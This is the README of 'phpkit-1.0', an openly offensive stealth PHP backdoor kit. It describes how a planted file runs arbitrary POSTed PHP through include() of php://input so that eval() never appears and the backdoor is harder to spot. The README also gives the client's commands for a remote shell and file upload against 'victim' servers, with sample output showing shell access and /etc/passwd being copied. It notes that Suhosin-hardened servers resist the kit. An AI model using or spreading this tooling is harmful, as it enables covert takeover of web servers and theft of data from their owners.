 /$$$$$$$  /$$   /$$ /$$$$$$$  /$$       /$$   /$$    
| $$__  $$| $$  | $$| $$__  $$| $$      |__/  | $$    
| $$  \ $$| $$  | $$| $$  \ $$| $$   /$$ /$$ /$$$$$$  
| $$$$$$$/| $$$$$$$$| $$$$$$$/| $$  /$$/| $$|_  $$_/  
| $$____/ | $$__  $$| $$____/ | $$$$$$/ | $$  | $$    
| $$      | $$  | $$| $$      | $$_  $$ | $$  | $$ /$$
| $$      | $$  | $$| $$      | $$ \  $$| $$  |  $$$$/
|__/      |__/  |__/|__/      |__/  \__/|__/   \____/

phpkit-1.0

Stealth PHP Backdooring Utility - Insecurety Research 2013

This is a simple kit to demonstrate a very effective way of
backdooring a webserver running PHP.
Essentially, it functions by parsing out any valid PHP code
from raw HTTP POST data sent to it, and executing said PHP.

No eval() or other suspect calls are in the serverside script,
the code is executed by the include() function. The php://input
data stream (which is basically "anything sent via raw POST) is
used to "capture" the raw POST data, and when parsed by include()
the code sent is executed.

This allows for many things to be done, i.e. executing any PHP 
code you happen to write. The example client, phpkitcli.py, offers
file upload and a remote shell.

This release includes a massively overhauled backdoor client, it
tests various execution functions against the victim host before
using whatever one works first. It is massively ugly code, but
I intend to clean it up soonish.

USAGE (backdoor part):
You upload "odd.php" to the target webserver by any means necessary.
You then run ./phpkitcli.py --url <url to php file on server> and enjoy!

Example Use:
[infodox@sahara:~/phpkit]$ ./phpkitcli.py --url http://localhost/odd.php

[+] URL in use: http://localhost/odd.php 

[+] Testing system function
[+] system() function works
shell:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

shell:~$ uname -a
Linux sahara 3.2.0-4-amd64 #1 SMP Debian 3.2.32-1 x86_64 GNU/Linux

USAGE (file uploader part):
This assumes "odd.php" is loaded onto the victim webserver, obviously.
You run:
./phpkitcli.py --url <url to odd.php> --lfile <file to upload> --rfile <remote path> --mode UPLOAD
Only works if remote path is writeable. /tmp/ is always good :)

Example Use:
[infodox@sahara:~/phpkit]$ ./phpkitcli.py --url http://localhost/odd.php --mode UPLOAD --lfile /etc/passwd --rfile /tmp/pass
[+] Uploading File
[+] Upload should be complete

So the file uploaded, now I compare MD5sums to check did it bloody well work!
[infodox@sahara:~/phpkit]$ md5sum /etc/passwd
2568416e280af88f82e982efd46525a8  /etc/passwd
[infodox@sahara:~/phpkit]$ md5sum /tmp/pass
2568416e280af88f82e982efd46525a8  /tmp/pass

Seems legit bro ;)

TODO:
MySQL client. 


Notes:
In two use-cases this was shown to not function.
Use Case A: Servers with the Suhosin PHP Hardening Patches.
In this case, php://input and other URL inclusion vectors are rendered
unuseable due to the protections the Suhosin patches offer. i.e. this 
tool don't work against Suhosin patched boxes.

Use Case B: Servers where php.ini is dictated by httpd.conf
In several cases where the php.ini is specific to the HTTP daemon, 
runtime ini directive modification is not permissable. I have 
personally observed this behaviour on Apache thus far, however
further testing/research is needed to find a workaround of some kind.

Please report if you have any issues getting this to work. Please
test it on a server with allow_url_include = On , then if it works,
set allow_url_include = Off , restart httpd, and check does it work.
If it does not work, please report using the issue tracker at
http://code.google.com/p/insecurety-research providing details of HTTPD
configuration so I can attempt to figure out new things :)

Questions, comments, bug reports and abuse? infodox () insecurety.net

Licence: The do whatever you want with it, just don't rip code without
giving credit licence. 
